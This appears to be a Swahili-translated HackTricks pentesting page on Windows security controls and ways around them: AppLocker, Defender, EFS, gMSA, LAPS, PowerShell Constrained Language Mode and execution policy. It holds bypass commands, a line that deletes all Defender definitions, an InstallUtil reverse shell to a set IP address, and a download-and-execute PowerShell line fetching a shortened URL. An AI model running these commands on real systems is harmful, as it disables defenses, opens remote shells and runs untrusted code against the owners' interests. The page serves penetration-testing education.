# Windows Security Controls

{{#include ../banners/hacktricks-training.md}}

<figure><img src="../images/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Tumia [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) kujenga na **kujiendesha kiotomatiki** kazi kwa urahisi zinazotolewa na zana za jamii **zilizoendelea zaidi** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## AppLocker Policy

Orodha ya programu ni orodha ya programu au executable zilizothibitishwa ambazo zinaruhusiwa kuwepo na kuendesha kwenye mfumo. Lengo ni kulinda mazingira kutokana na malware hatari na programu zisizothibitishwa ambazo hazilingani na mahitaji maalum ya biashara ya shirika.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) ni **suluhisho la orodha ya programu** la Microsoft na inawapa wasimamizi wa mifumo udhibiti juu ya **ni programu na faili zipi watumiaji wanaweza kuendesha**. Inatoa **udhibiti wa kina** juu ya executable, scripts, faili za installer za Windows, DLLs, programu zilizopakiwa, na waandishi wa programu zilizopakiwa.\
Ni kawaida kwa mashirika **kuzuia cmd.exe na PowerShell.exe** na kuandika ufikiaji kwa baadhi ya directories, **lakini hii yote inaweza kupuuziliwa mbali**.

### Check

Angalia faili/nyongeza zipi zimeorodheshwa kwenye orodha ya mblacklist/mwhite list:
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Hii njia ya rejista inaelezea mipangilio na sera zinazotumika na AppLocker, ikitoa njia ya kupitia seti ya sasa ya sheria zinazotekelezwa kwenye mfumo:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- **Mafolda yanayoweza kuandikwa** yenye manufaa ili kupita Sera ya AppLocker: Ikiwa AppLocker inaruhusu kutekeleza chochote ndani ya `C:\Windows\System32` au `C:\Windows` kuna **mafolda yanayoweza kuandikwa** unaweza kutumia ili **kupita hii**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Binaries za **"LOLBAS's"** [**zilizoaminika**](https://lolbas-project.github.io/) zinaweza pia kuwa na manufaa katika kuepuka AppLocker.
- **Kanuni zilizoandikwa vibaya zinaweza pia kupuuziliwa mbali**
- Kwa mfano, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, unaweza kuunda **folda inayoitwa `allowed`** mahali popote na itaruhusiwa.
- Mashirika mara nyingi pia yanazingatia **kuzuia `%System32%\WindowsPowerShell\v1.0\powershell.exe` executable**, lakini yanasahau kuhusu **mikoa mingine** [**ya PowerShell executable**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) kama vile `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` au `PowerShell_ISE.exe`.
- **DLL enforcement mara chache huwekwa** kutokana na mzigo wa ziada ambao inaweza kuweka kwenye mfumo, na kiasi cha upimaji kinachohitajika kuhakikisha hakuna kitu kitaharibika. Hivyo kutumia **DLLs kama milango ya nyuma kutasaidia kuepuka AppLocker**.
- Unaweza kutumia [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) au [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili **kutekeleza Powershell** msimbo katika mchakato wowote na kupuuzilia mbali AppLocker. Kwa maelezo zaidi angalia: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Hifadhi ya Akida

### Meneja wa Akaunti za Usalama (SAM)

Akida za ndani zipo katika faili hii, nywila zimepangwa.

### Mamlaka ya Usalama wa Mitaa (LSA) - LSASS

**Akida** (zilizopangwa) zime **hifadhiwa** katika **kumbukumbu** ya mfumo huu kwa sababu za Usajili wa Moja.\
**LSA** inasimamia **sera ya usalama** ya ndani (sera ya nywila, ruhusa za watumiaji...), **uthibitishaji**, **token za ufikiaji**...\
LSA itakuwa ile itakayofanya **ukaguzi** wa akida zilizotolewa ndani ya faili ya **SAM** (kwa kuingia kwa ndani) na **kuzungumza** na **kikundi cha kudhibiti** ili kuthibitisha mtumiaji wa kikoa.

**Akida** zime **hifadhiwa** ndani ya **mchakato wa LSASS**: tiketi za Kerberos, hash za NT na LM, nywila zinazoweza kufichuliwa kwa urahisi.

### Siri za LSA

LSA inaweza kuhifadhi kwenye diski baadhi ya akida:

- Nywila ya akaunti ya kompyuta ya Active Directory (kikundi cha kudhibiti kisichoweza kufikiwa).
- Nywila za akaunti za huduma za Windows
- Nywila za kazi zilizopangwa
- Zaidi (nywila za programu za IIS...)

### NTDS.dit

Ni hifadhidata ya Active Directory. Inapatikana tu katika Vikundi vya Kudhibiti.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) ni Antivirus inayopatikana katika Windows 10 na Windows 11, na katika matoleo ya Windows Server. In **azuia** zana za kawaida za pentesting kama **`WinPEAS`**. Hata hivyo, kuna njia za **kuepuka ulinzi huu**.

### Angalia

Ili kuangalia **hali** ya **Defender** unaweza kutekeleza cmdlet ya PS **`Get-MpComputerStatus`** (angalia thamani ya **`RealTimeProtectionEnabled`** kujua kama inafanya kazi):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Ili kuhesabu unaweza pia kukimbia:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS inalinda faili kupitia usimbaji, ikitumia **symmetric key** inayojulikana kama **File Encryption Key (FEK)**. Funguo hii inasimbwa kwa kutumia **public key** ya mtumiaji na kuhifadhiwa ndani ya $EFS **alternative data stream** ya faili iliyosimbwa. Wakati usimbuaji unahitajika, **private key** inayolingana ya cheti cha kidijitali cha mtumiaji inatumika kusimbua FEK kutoka kwenye $EFS stream. Maelezo zaidi yanaweza kupatikana [hapa](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Mifano ya Usimbuaji bila kuanzishwa na mtumiaji** ni pamoja na:

- Wakati faili au folda zinapohamishwa kwenye mfumo wa faili usio EFS, kama [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), zinapaswa kusimbuliwa moja kwa moja.
- Faili zilizofichwa zinazotumwa kupitia mtandao kwa kutumia SMB/CIFS protocol zinapaswa kusimbuliwa kabla ya usafirishaji.

Njia hii ya usimbuaji inaruhusu **upatikanaji wa wazi** kwa faili zilizofichwa kwa mmiliki. Hata hivyo, kubadilisha tu nenosiri la mmiliki na kuingia hakutaruhusu usimbuaji.

**Mambo Muhimu**:

- EFS inatumia FEK ya symmetric, iliyosimbwa kwa kutumia public key ya mtumiaji.
- Usimbuaji unatumia private key ya mtumiaji kupata FEK.
- Usimbuaji wa moja kwa moja unafanyika chini ya hali maalum, kama vile kunakili kwenye FAT32 au usafirishaji wa mtandao.
- Faili zilizofichwa zinapatikana kwa mmiliki bila hatua za ziada.

### Angalia taarifa za EFS

Angalia kama **mtumiaji** amekuwa **akitumia** huduma hii kwa kuangalia kama njia hii inapatikana:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Angalia **nani** ana **upatikanaji** wa faili kwa kutumia cipher /c \<file>\
Unaweza pia kutumia `cipher /e` na `cipher /d` ndani ya folda ili **kusimbua** na **kusimbua** faili zote

### Kusimbua faili za EFS

#### Kuwa Mamlaka ya Mfumo

Njia hii inahitaji **mtumiaji wa kidhulumu** kuwa **akifanya** **mchakato** ndani ya mwenyeji. Ikiwa hiyo ni kesi, kwa kutumia `meterpreter` sessions unaweza kujifanya kuwa token ya mchakato wa mtumiaji (`impersonate_token` kutoka `incognito`). Au unaweza tu `migrate` kwenye mchakato wa mtumiaji.

#### Kujua nenosiri la watumiaji

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## Group Managed Service Accounts (gMSA)

Microsoft ilitengeneza **Group Managed Service Accounts (gMSA)** ili kurahisisha usimamizi wa akaunti za huduma katika miundombinu ya IT. Tofauti na akaunti za huduma za jadi ambazo mara nyingi zina mipangilio ya "**Password never expire**" iliyowekwa, gMSAs hutoa suluhisho salama na linaloweza kusimamiwa zaidi:

- **Usimamizi wa Nenosiri wa Moja kwa Moja**: gMSAs hutumia nenosiri tata la herufi 240 ambalo hubadilika moja kwa moja kulingana na sera ya kikoa au kompyuta. Mchakato huu unashughulikiwa na Huduma ya Usambazaji wa Funguo ya Microsoft (KDC), ikiondoa haja ya masasisho ya nenosiri ya mkono.
- **Usalama Ulioimarishwa**: Akaunti hizi hazihusiki na kufungwa na haziwezi kutumika kwa kuingia kwa mwingiliano, kuimarisha usalama wao.
- **Msaada wa Wenyeji Wengi**: gMSAs zinaweza kushirikiwa kati ya wenyeji wengi, na kuifanya kuwa bora kwa huduma zinazotumia seva nyingi.
- **Uwezo wa Kazi Iliyopangwa**: Tofauti na akaunti za huduma zinazodhibitiwa, gMSAs zinasaidia kuendesha kazi zilizopangwa.
- **Usimamizi wa SPN Ulio Rahisishwa**: Mfumo unasasisha moja kwa moja Jina la Kiongozi wa Huduma (SPN) wakati kuna mabadiliko katika maelezo ya sAMaccount ya kompyuta au jina la DNS, kuimarisha usimamizi wa SPN.

Nenosiri za gMSAs zinahifadhiwa katika mali ya LDAP _**msDS-ManagedPassword**_ na zinarejeshwa moja kwa moja kila siku 30 na Wajibu wa Kikoa (DCs). Nenosiri hili, blob ya data iliyosimbwa inayojulikana kama [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), linaweza kupatikana tu na wasimamizi walioidhinishwa na seva ambazo gMSAs zimewekwa, kuhakikisha mazingira salama. Ili kufikia taarifa hii, unahitaji muunganisho salama kama LDAPS, au muunganisho lazima uthibitishwe na 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)

Unaweza kusoma nenosiri hili kwa kutumia [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Pata maelezo zaidi katika chapisho hili**](https://cube0x0.github.io/Relaying-for-gMSA/)

Pia, angalia hii [ukurasa wa wavuti](https://cube0x0.github.io/Relaying-for-gMSA/) kuhusu jinsi ya kufanya **NTLM relay attack** ili **kusoma** **nenosiri** la **gMSA**.

## LAPS

**Local Administrator Password Solution (LAPS)**, inayopatikana kwa kupakuliwa kutoka [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), inaruhusu usimamizi wa nenosiri za Msimamizi wa ndani. Nenosiri haya, ambayo ni **ya nasibu**, ya kipekee, na **yanabadilishwa mara kwa mara**, huhifadhiwa kwa kati katika Active Directory. Ufikiaji wa nenosiri haya umewekwa vizuizi kupitia ACLs kwa watumiaji walioidhinishwa. Kwa ruhusa ya kutosha, uwezo wa kusoma nenosiri za msimamizi wa ndani unapatikana.

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **inafungia mbali vipengele vingi** vinavyohitajika kutumia PowerShell kwa ufanisi, kama vile kuzuia vitu vya COM, kuruhusu tu aina za .NET zilizothibitishwa, michakato ya XAML, madarasa ya PowerShell, na zaidi.

### **Angalia**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Kupita
```powershell
#Easy bypass
Powershell -version 2
```
Katika Windows ya sasa, Bypass hiyo haitafanya kazi lakini unaweza kutumia [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Ili kuikamilisha unaweza kuhitaji** **kui** _**Ongeza Rejeleo**_ -> _Browse_ -> _Browse_ -> ongeza `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` na **badilisha mradi kuwa .Net4.5**.

#### Bypass ya moja kwa moja:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Unaweza kutumia [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) au [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili **kutekeleza Powershell** msimbo katika mchakato wowote na kupita njia iliyozuiliwa. Kwa maelezo zaidi angalia: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Sera ya Utekelezaji wa PS

Kwa default imewekwa kuwa **imezuiliwa.** Njia kuu za kupita sera hii:
```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
More can be found [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Security Support Provider Interface (SSPI)

Ni API inayoweza kutumika kuthibitisha watumiaji.

SSPI itakuwa na jukumu la kutafuta itifaki inayofaa kwa mashine mbili zinazotaka kuwasiliana. Njia inayopendekezwa kwa hili ni Kerberos. Kisha SSPI itajadili itifaki ipi ya uthibitishaji itakayokuwa inatumika, hizi itifaki za uthibitishaji zinaitwa Security Support Provider (SSP), ziko ndani ya kila mashine ya Windows katika mfumo wa DLL na mashine zote mbili lazima ziunge mkono ile ile ili kuweza kuwasiliana.

### Main SSPs

- **Kerberos**: Ya kupendelea
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** na **NTLMv2**: Sababu za ulinganifu
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Seva za wavuti na LDAP, nenosiri katika mfumo wa MD5 hash
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL na TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Inatumika kujadili itifaki ya kutumia (Kerberos au NTLM, Kerberos ikiwa chaguo la msingi)
- %windir%\Windows\System32\lsasrv.dll

#### The negotiation could offer several methods or only one.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ni kipengele kinachowezesha **kuonyeshwa kwa idhini kwa shughuli zilizoimarishwa**.

{{#ref}}
windows-security-controls/uac-user-account-control.md
{{#endref}}

<figure><img src="../images/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Tumia [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) kujenga na **kujiendesha kiotomatiki** kwa urahisi kwa kutumia zana za jamii **zilizoendelea zaidi** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

---

{{#include ../banners/hacktricks-training.md}}
